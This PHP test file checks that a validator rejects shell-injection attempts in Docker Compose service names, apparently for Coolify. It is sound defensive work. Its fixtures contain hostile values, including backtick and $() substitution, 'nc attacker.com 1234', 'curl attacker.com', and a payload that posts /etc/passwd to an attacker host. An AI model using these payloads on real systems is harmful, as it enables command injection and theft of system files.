<?php

use App\Models\Service;
use Symfony\Component\Yaml\Yaml;

test('service names with backtick injection are rejected', function () {
    $maliciousCompose = <<<'YAML'
services:
  'evil`whoami`':
    image: alpine
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceName = array_key_first($parsed['services']);

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->toThrow(Exception::class, 'backtick');
});

test('service names with command substitution are rejected', function () {
    $maliciousCompose = <<<'YAML'
services:
  'evil$(cat /etc/passwd)':
    image: alpine
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceName = array_key_first($parsed['services']);

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->toThrow(Exception::class, 'command substitution');
});

test('service names with pipe injection are rejected', function () {
    $maliciousCompose = <<<'YAML'
services:
  'web | nc attacker.com 1234':
    image: nginx
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceName = array_key_first($parsed['services']);

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->toThrow(Exception::class, 'pipe');
});

test('service names with semicolon injection are rejected', function () {
    $maliciousCompose = <<<'YAML'
services:
  'web; curl attacker.com':
    image: nginx
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceName = array_key_first($parsed['services']);

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->toThrow(Exception::class, 'separator');
});

test('service names with ampersand injection are rejected', function () {
    $maliciousComposes = [
        "services:\n  'web & curl attacker.com':\n    image: nginx",
        "services:\n  'web && curl attacker.com':\n    image: nginx",
    ];

    foreach ($maliciousComposes as $compose) {
        $parsed = Yaml::parse($compose);
        $serviceName = array_key_first($parsed['services']);

        expect(fn () => validateShellSafePath($serviceName, 'service name'))
            ->toThrow(Exception::class, 'operator');
    }
});

test('service names with redirection are rejected', function () {
    $maliciousComposes = [
        "services:\n  'web > /dev/null':\n    image: nginx",
        "services:\n  'web < input.txt':\n    image: nginx",
    ];

    foreach ($maliciousComposes as $compose) {
        $parsed = Yaml::parse($compose);
        $serviceName = array_key_first($parsed['services']);

        expect(fn () => validateShellSafePath($serviceName, 'service name'))
            ->toThrow(Exception::class);
    }
});

test('legitimate service names are accepted', function () {
    $legitCompose = <<<'YAML'
services:
  web:
    image: nginx
  api:
    image: node:20
  database:
    image: postgres:15
  redis-cache:
    image: redis:7
  app_server:
    image: python:3.11
  my-service.com:
    image: alpine
YAML;

    $parsed = Yaml::parse($legitCompose);

    foreach ($parsed['services'] as $serviceName => $service) {
        expect(fn () => validateShellSafePath($serviceName, 'service name'))
            ->not->toThrow(Exception::class);
    }
});

test('service names used in docker network connect command', function () {
    // This demonstrates the actual vulnerability from StartService.php:41
    $maliciousServiceName = 'evil`curl attacker.com`';
    $uuid = 'test-uuid-123';
    $network = 'coolify';

    // Without validation, this would create a dangerous command
    $dangerousCommand = "docker network connect --alias {$maliciousServiceName}-{$uuid} $network {$maliciousServiceName}-{$uuid}";

    expect($dangerousCommand)->toContain('`curl attacker.com`');

    // With validation, the service name should be rejected
    expect(fn () => validateShellSafePath($maliciousServiceName, 'service name'))
        ->toThrow(Exception::class);
});

test('service name from the vulnerability report example', function () {
    // The example could also target service names
    $maliciousCompose = <<<'YAML'
services:
  'coolify`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`':
    image: alpine
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceName = array_key_first($parsed['services']);

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->toThrow(Exception::class);
});

test('service names with newline injection are rejected', function () {
    $maliciousServiceName = "web\ncurl attacker.com";

    expect(fn () => validateShellSafePath($maliciousServiceName, 'service name'))
        ->toThrow(Exception::class, 'newline');
});

test('service names with variable substitution patterns are rejected', function () {
    $maliciousNames = [
        'web${PATH}',
        'app${USER}',
        'db${PWD}',
    ];

    foreach ($maliciousNames as $name) {
        expect(fn () => validateShellSafePath($name, 'service name'))
            ->toThrow(Exception::class);
    }
});

test('service names provide helpful error messages', function () {
    $maliciousServiceName = 'evil`command`';

    try {
        validateShellSafePath($maliciousServiceName, 'service name');
        expect(false)->toBeTrue('Should have thrown exception');
    } catch (Exception $e) {
        expect($e->getMessage())->toContain('service name');
        expect($e->getMessage())->toContain('backtick');
    }
});

test('multiple malicious services in one compose file', function () {
    $maliciousCompose = <<<'YAML'
services:
  'web`whoami`':
    image: nginx
  'api$(cat /etc/passwd)':
    image: node
  database:
    image: postgres
  'cache; curl attacker.com':
    image: redis
YAML;

    $parsed = Yaml::parse($maliciousCompose);
    $serviceNames = array_keys($parsed['services']);

    // First and second service names should fail
    expect(fn () => validateShellSafePath($serviceNames[0], 'service name'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath($serviceNames[1], 'service name'))
        ->toThrow(Exception::class);

    // Third service name should pass (legitimate)
    expect(fn () => validateShellSafePath($serviceNames[2], 'service name'))
        ->not->toThrow(Exception::class);

    // Fourth service name should fail
    expect(fn () => validateShellSafePath($serviceNames[3], 'service name'))
        ->toThrow(Exception::class);
});

test('service names with spaces are allowed', function () {
    // Spaces themselves are not dangerous - shell escaping handles them
    // Docker Compose might not allow spaces in service names anyway, but we shouldn't reject them
    $serviceName = 'my service';

    expect(fn () => validateShellSafePath($serviceName, 'service name'))
        ->not->toThrow(Exception::class);
});

test('common Docker Compose service naming patterns are allowed', function () {
    $commonNames = [
        'web',
        'api',
        'database',
        'redis',
        'postgres',
        'mysql',
        'mongodb',
        'app-server',
        'web_frontend',
        'api.backend',
        'db-01',
        'worker_1',
        'service123',
    ];

    foreach ($commonNames as $name) {
        expect(fn () => validateShellSafePath($name, 'service name'))
            ->not->toThrow(Exception::class);
    }
});
